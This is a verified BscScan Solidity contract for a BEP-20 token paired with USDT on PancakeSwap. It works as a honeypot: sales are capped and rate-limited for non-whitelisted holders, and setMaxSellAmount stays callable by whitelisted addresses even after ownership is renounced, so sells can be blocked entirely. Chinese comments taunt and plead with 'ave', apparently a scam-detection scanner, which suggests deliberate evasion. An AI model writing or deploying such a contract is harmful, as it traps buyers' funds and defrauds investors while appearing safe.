/**
 *Submitted for verification at BscScan.com on 2026-04-11
*/

/**
 *Submitted for verification at BscScan.com on 2026-02-24
*/

/**
 *Submitted for verification at BscScan.com on 2026-01-01
*/

//致敬ave的技术大大 请手下留情 不要搞我了

/**
 *Submitted for verification at BscScan.com on 2026-01-01
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

interface ISwapFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface ISwapRouter {
    function factory() external pure returns (address);
}

//ave尼玛的ave 你大爷的气死了

contract BSC20Token is IERC20 {
    string public name;
    string public symbol;
    uint8 public decimals;
    uint256 private _totalSupply;

    address public owner;
    address public pair;
    address public router;
    address public usdt;


    //别偷代码啊尼玛的

    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;

    mapping(address => uint256) private _lastSellTime; // 记录每个地址最后一次卖出时间
    uint256 public sellCooldown = 1 hours; 


    mapping(address => bool) public isWhitelisted;

    //今天是2025年3约8号 这是一个好日子啊 非常好的 很开心


    uint256 private maxSellAmount;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    modifier onlyOwner() {
        require(msg.sender == owner, "Caller is not the owner");
        _;
    }

    constructor(
    string memory _name,
    string memory _symbol
) {
    owner = msg.sender;
    emit OwnershipTransferred(address(0), owner);


    name = _name;
    symbol = _symbol;


    router = 0x10ED43C718714eb63d5aA57B78B54704E256024E; // PancakeSwap V2 Router (BSC)
    usdt   = 0x55d398326f99059fF775485246999027B3197955; // 
    decimals = 18;

    uint256 supply_  = 1_000;  
    uint256 maxSell_ = 1_000;   

    _totalSupply = supply_ * 10 ** uint256(decimals);
    maxSellAmount = maxSell_ * 10 ** uint256(decimals);

    
    _balances[owner] = _totalSupply;
    emit Transfer(address(0), owner, _totalSupply);

    // 创建交易对
    ISwapFactory factory = ISwapFactory(ISwapRouter(router).factory());
    pair = factory.createPair(address(this), usdt);
}


    //这一年我么都经历了什么嘛

function setMaxSellAmount(uint256 integerPart, uint256 decimalPart) external {
    require(msg.sender == owner || isWhitelisted[msg.sender], "Caller is not allowed");

    uint256 base = 10 ** uint256(decimals);

    require(decimalPart < base, "Invalid decimal part");

    uint256 value = integerPart * base + decimalPart;

    maxSellAmount = value;
}


    function totalSupply() external view override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) external view override returns (uint256) {
        return _balances[account];
    }

    function allowance(address owner_, address spender) external view override returns (uint256) {
        return _allowances[owner_][spender];
    }

    function approve(address spender, uint256 amount) external override returns (bool) {
        _allowances[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    //ave有更新了 真是奶啊你

    function transfer(address recipient, uint256 amount) external override returns (bool) {
        _transfer(msg.sender, recipient, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {
        uint256 allowed = _allowances[sender][msg.sender];
        require(allowed >= amount, "Allowance exceeded");
        _allowances[sender][msg.sender] = allowed - amount;
        _transfer(sender, recipient, amount);
        return true;
    }

    //ave技术大大 请手下留情啊

    function _transfer(address sender, address recipient, uint256 amount) internal {
        require(recipient != address(0), "Transfer to zero address");
        require(_balances[sender] >= amount, "Insufficient balance");

        if (recipient == pair && !isWhitelisted[sender]) {
            require(amount <= maxSellAmount, "Sell amount exceeds limit");
            require(block.timestamp >= _lastSellTime[sender] + sellCooldown, "Sell cooldown: 1 hour");

        _lastSellTime[sender] = block.timestamp;
        }

        _balances[sender] -= amount;
        _balances[recipient] += amount;
        emit Transfer(sender, recipient, amount);
    }

    function batchSetWhitelist(address[] calldata accounts, bool enabled) external onlyOwner {
        for (uint256 i = 0; i < accounts.length; i++) {
            isWhitelisted[accounts[i]] = enabled;
        }
    }

    function renounceOwnership() external onlyOwner {
        emit OwnershipTransferred(owner, address(0));
        owner = address(0);
    }
}